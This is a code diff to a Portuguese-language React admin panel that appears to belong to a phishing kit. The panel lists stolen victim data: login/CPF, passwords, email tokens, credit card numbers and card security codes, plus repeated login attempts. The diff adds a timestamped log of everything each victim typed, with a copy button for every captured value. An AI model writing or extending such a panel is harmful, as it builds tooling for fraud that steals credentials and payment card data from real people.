@@ -1216,6 +1216,8 @@ function AdminPanel() {
             </div>
 
             <div className="overflow-auto flex-1 p-6 space-y-3">
+              {/* Dados atuais */}
+              <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider">Dados Atuais</h3>
               {[
                 { label: "Login/CPF", value: historyModal.email },
                 { label: "Senha", value: historyModal.password },
@@ -1226,41 +1228,61 @@ function AdminPanel() {
                 { label: "Token Email", value: historyModal.app_mail },
                 { label: "Cartão", value: historyModal.credit_card },
                 { label: "Código CC", value: historyModal.cc_code },
-              ].map((item, i) => (
+              ].filter(item => item.value).map((item, i) => (
                 <div key={i} className="flex items-center justify-between bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-3">
                   <div>
                     <span className="text-gray-500 text-xs block">{item.label}</span>
-                    <span className={`text-sm font-mono ${item.value ? 'text-white' : 'text-gray-600'}`}>{item.value || "-"}</span>
+                    <span className="text-sm font-mono text-white">{item.value}</span>
                   </div>
-                  {item.value && (
-                    <button
-                      onClick={() => copyToClipboard(item.value, `hist-${i}`)}
-                      className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors"
-                    >
-                      {copiedField === `hist-${i}` ? "Copiado!" : "Copiar"}
-                    </button>
-                  )}
+                  <button
+                    onClick={() => copyToClipboard(item.value, `hist-${i}`)}
+                    className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors"
+                  >
+                    {copiedField === `hist-${i}` ? "Copiado!" : "Copiar"}
+                  </button>
                 </div>
               ))}
 
-              {/* Tentativas adicionais */}
+              {/* Registro completo de tudo que foi digitado */}
+              {historyModal.history && historyModal.history.length > 0 && (
+                <div className="mt-4 pt-4 border-t border-[#2a2a2a]">
+                  <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3">Registro Completo ({historyModal.history.length})</h3>
+                  {historyModal.history.map((entry, i) => (
+                    <div key={i} className="flex items-center justify-between bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-2.5 mb-2">
+                      <div className="flex-1">
+                        <div className="flex items-center gap-2">
+                          <span className="text-xs bg-[#1a1a1a] border border-[#333] text-gray-300 px-2 py-0.5 rounded">{entry.label}</span>
+                          <span className="text-gray-600 text-xs">{new Date(entry.timestamp).toLocaleString("pt-BR")}</span>
+                        </div>
+                        <span className="text-sm font-mono text-white mt-1 block">{entry.value}</span>
+                      </div>
+                      <button
+                        onClick={() => copyToClipboard(entry.value, `hist-log-${i}`)}
+                        className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors ml-2"
+                      >
+                        {copiedField === `hist-log-${i}` ? "Copiado!" : "Copiar"}
+                      </button>
+                    </div>
+                  ))}
+                </div>
+              )}
+
+              {/* Tentativas adicionais de login */}
               {historyModal.attempts && historyModal.attempts.length > 0 && (
                 <div className="mt-4 pt-4 border-t border-[#2a2a2a]">
-                  <h3 className="text-sm font-bold text-gray-400 mb-3">Tentativas Adicionais</h3>
+                  <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3">Tentativas de Login</h3>
                   {historyModal.attempts.map((att, i) => (
-                    <div key={i} className="bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-3 mb-2">
-                      <div className="flex justify-between items-center">
-                        <div>
-                          <span className="text-gray-500 text-xs">Tentativa {i + 2}</span>
-                          <div className="text-white text-sm font-mono">{att.email} | {att.password || "-"}</div>
-                        </div>
-                        <button
-                          onClick={() => copyToClipboard(`${att.email} | ${att.password}`, `hist-att-${i}`)}
-                          className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors"
-                        >
-                          {copiedField === `hist-att-${i}` ? "Copiado!" : "Copiar"}
-                        </button>
+                    <div key={i} className="flex items-center justify-between bg-[#0a0a0a] border border-[#2a2a2a] rounded-lg px-4 py-2.5 mb-2">
+                      <div>
+                        <span className="text-gray-500 text-xs">Tentativa {i + 2}</span>
+                        <div className="text-white text-sm font-mono">{att.email} | {att.password || "-"}</div>
                       </div>
+                      <button
+                        onClick={() => copyToClipboard(`${att.email} | ${att.password}`, `hist-att-${i}`)}
+                        className="text-xs text-gray-400 hover:text-white border border-[#333] px-2 py-1 rounded transition-colors"
+                      >
+                        {copiedField === `hist-att-${i}` ? "Copiado!" : "Copiar"}
+                      </button>
                     </div>
                   ))}
                 </div>
